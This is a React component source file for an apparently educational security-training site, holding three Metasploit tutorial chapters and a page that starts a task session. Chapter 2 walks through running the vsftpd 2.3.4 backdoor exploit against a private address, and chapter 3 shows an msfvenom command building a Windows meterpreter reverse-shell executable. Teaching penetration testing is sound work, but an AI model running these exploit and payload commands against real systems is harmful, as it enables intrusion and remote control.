import React, { useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import "../../styles/Chapter.css";
import api from "../../services/api.js"



const chapterData = {
  chapter1: {
    title: "Introduction to Metasploit Framework",
    content: (
      <div>
        <h3>Overview</h3>
        <p>
          The Metasploit Framework (MSF) is a widely used open-source penetration testing and exploitation framework 
          maintained by Rapid7. It enables security professionals and ethical hackers to simulate real-world attacks 
          in a controlled environment.
        </p>

        <h3>Core Components</h3>
        
        <h4>1. MSFconsole</h4>
        <div className="navigation-tips">
          <ul>
            <li>Primary command-line interface for Metasploit</li>
            <li>Features command history and tab completion</li>
            <li>Provides access to all framework functionalities</li>
          </ul>
        </div>

        <h4>2. Module System</h4>
        <div className="command-table">
          <table>
            <tbody>
              <tr>
                <td><strong>Exploit Modules:</strong></td>
                <td>Code that targets specific vulnerabilities</td>
              </tr>
              <tr>
                <td><strong>Payload Modules:</strong></td>
                <td>Code executed on targets after successful exploitation</td>
              </tr>
              <tr>
                <td><strong>Auxiliary Modules:</strong></td>
                <td>Tools for scanning, fuzzing, and sniffing</td>
              </tr>
              <tr>
                <td><strong>Post Modules:</strong></td>
                <td>Post-exploitation tools for gathering credentials and more</td>
              </tr>
              <tr>
                <td><strong>Encoders:</strong></td>
                <td>Tools to obfuscate payloads and bypass detection</td>
              </tr>
              <tr>
                <td><strong>Nops:</strong></td>
                <td>No-Operation instruction generators for shellcode padding</td>
              </tr>
            </tbody>
          </table>
        </div>

        <h4>3. Meterpreter</h4>
        <div className="navigation-tips">
          <p>
            An advanced, interactive payload that provides extensive post-exploitation capabilities including:
          </p>
          <ul>
            <li>Privilege escalation</li>
            <li>Keylogging</li>
            <li>File system manipulation</li>
          </ul>
        </div>

        <h4>4. Database Integration</h4>
        <div className="navigation-tips">
          <ul>
            <li>PostgreSQL backend for data storage</li>
            <li>Stores host, service, and exploit information</li>
            <li>Enables comprehensive reconnaissance and reporting</li>
          </ul>
        </div>

        <h3>Common Use Cases</h3>
        <div className="command-table">
          <table>
            <tbody>
              <tr>
                <td><strong>Vulnerability Assessment:</strong></td>
                <td>Automated testing against known CVEs</td>
              </tr>
              <tr>
                <td><strong>Exploit Development:</strong></td>
                <td>Creation and testing of custom exploits</td>
              </tr>
              <tr>
                <td><strong>Red Teaming:</strong></td>
                <td>Simulation of real attack scenarios</td>
              </tr>
              <tr>
                <td><strong>Security Research:</strong></td>
                <td>Malware analysis and binary reverse engineering</td>
              </tr>
              <tr>
                <td><strong>Training & Education:</strong></td>
                <td>Safe environment for learning about vulnerabilities</td>
              </tr>
            </tbody>
          </table>
        </div>

        <div className="warning-box">
          <h4>⚠️ Legal Considerations</h4>
          <p>
            Metasploit must only be used on systems you own or have explicit permission to test. 
            Unauthorized use is illegal and unethical.
          </p>
        </div>

        <h3>Basic MSF Commands</h3>
        <pre className="command-block">
{`msfconsole          # Start the Metasploit console
search [term]       # Search for modules
use [module path]   # Select a module to use
show options       # Display module options
set [option] [value] # Configure module options`}
        </pre>
      </div>
    ),
  },
  chapter2: {
    title: "Navigation and Basic Commands in MSFconsole",
    content: (
      <div>
        <h3>Getting Started with MSFconsole</h3>
        <p>
          MSFconsole is your primary interface to the Metasploit Framework, providing access to all modules 
          and capabilities. This chapter covers essential navigation and commands to help you use it effectively.
        </p>

        <h3>Launching MSFconsole</h3>
        <p>
          To start Metasploit Framework, open your terminal and enter:
        </p>
        <pre className="command-block">
{`msfconsole`}
        </pre>
        <p>
          Upon successful launch, you'll see the MSF banner and the prompt:
        </p>
        <pre className="command-block">
{`msf6 >`}
        </pre>

        <h3>Essential Commands</h3>
        <div className="command-table">
          <table>
            <thead>
              <tr>
                <th>Command</th>
                <th>Description</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><code>help</code> or <code>?</code></td>
                <td>Lists all available commands</td>
              </tr>
              <tr>
                <td><code>search &lt;term&gt;</code></td>
                <td>Finds modules related to a keyword</td>
              </tr>
              <tr>
                <td><code>use &lt;module&gt;</code></td>
                <td>Loads a module (exploit, auxiliary, etc.)</td>
              </tr>
              <tr>
                <td><code>info</code></td>
                <td>Displays details about a loaded module</td>
              </tr>
              <tr>
                <td><code>show exploits</code></td>
                <td>Lists all available exploits</td>
              </tr>
              <tr>
                <td><code>show payloads</code></td>
                <td>Lists compatible payloads</td>
              </tr>
              <tr>
                <td><code>show options</code></td>
                <td>Displays configurable options for a module</td>
              </tr>
              <tr>
                <td><code>set &lt;opt&gt; &lt;value&gt;</code></td>
                <td>Assigns a value to a module's option</td>
              </tr>
              <tr>
                <td><code>run</code> or <code>exploit</code></td>
                <td>Executes the module</td>
              </tr>
              <tr>
                <td><code>back</code></td>
                <td>Unloads the current module</td>
              </tr>
              <tr>
                <td><code>exit</code> or <code>quit</code></td>
                <td>Exits Metasploit</td>
              </tr>
            </tbody>
          </table>
        </div>

        <h3>Practical Example</h3>
        <p>
          Let's walk through a typical workflow of exploiting a vulnerable FTP service:
        </p>
        
        <h4>1. Search for a Module</h4>
        <pre className="command-block">
{`search vsftpd`}
        </pre>

        <h4>2. Select an Exploit</h4>
        <pre className="command-block">
{`use exploit/unix/ftp/vsftpd_234_backdoor`}
        </pre>

        <h4>3. Check Required Options</h4>
        <pre className="command-block">
{`show options`}
        </pre>

        <h4>4. Set the Target</h4>
        <pre className="command-block">
{`set RHOSTS 192.168.1.100`}
        </pre>

        <h4>5. Execute the Exploit</h4>
        <pre className="command-block">
{`run`}
        </pre>

        <h3>Navigation Tips</h3>
        <ul>
          <li>
            <strong>Tab Completion:</strong> Press Tab to auto-complete commands and module paths
          </li>
          <li>
            <strong>Command History:</strong> Use up/down arrow keys to scroll through previously used commands
          </li>
          <li>
            <strong>Module Context:</strong> The prompt changes to show your current context (e.g., <code>msf6 exploit(vsftpd_234_backdoor) ></code>)
          </li>
        </ul>

        <div className="warning-box">
          <h4>⚠️ Best Practices</h4>
          <p>
            Always verify your target information before executing exploits. Double-check IP addresses 
            and ports to avoid unintended targets.
          </p>
        </div>
      </div>
    ),
  },
  chapter3: {
    title: "MSFvenom Payload Creation",
    content: (
      <div>
        <h3>Creating Payloads with MSFvenom</h3>
        <p>
          MSFvenom is Metasploit's payload generator and encoder, essential for creating
          custom payloads for various scenarios.
        </p>
        <h4>Common MSFvenom Commands:</h4>
        <pre>
{`# List payloads
msfvenom -l payloads

# Basic payload creation
msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format]

# Example:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe`}
        </pre>
        <p>
          Understanding payload types, formats, and encoding options is crucial for successful
          exploitation.
        </p>
      </div>
    ),
  },
};

const Chapter = () => {
  const { chapterId } = useParams();
  const navigate = useNavigate();
  const chapter = chapterData[chapterId];

  useEffect(() => {
    const token = localStorage.getItem("token");
    if (!token) navigate("/login");
  }, [navigate]);

const handleStartTask = async () => {
    const token = localStorage.getItem('token');

    if (!token) {
        navigate('/login');
        return;
    }

    try {
        const response = await api.post('/tasks/start-task');
        const sessionId = response.data.session_id;
        // Pass the chapter ID in the navigation
        navigate(`/task-session/${sessionId}/${chapterId}`);
    } catch (error) {
        console.error('Error starting task:', error);
    }
};

  if (!chapter) {
    return <div className="chapter-container">Chapter not found.</div>;
  }

  

  return (
    <div className="chapter-container">
      <h2>{chapter.title}</h2>
      <div>{chapter.content}</div>
      <button className="start-task-button" onClick={handleStartTask}>Start Task</button>
    </div>
  );
};

export default Chapter;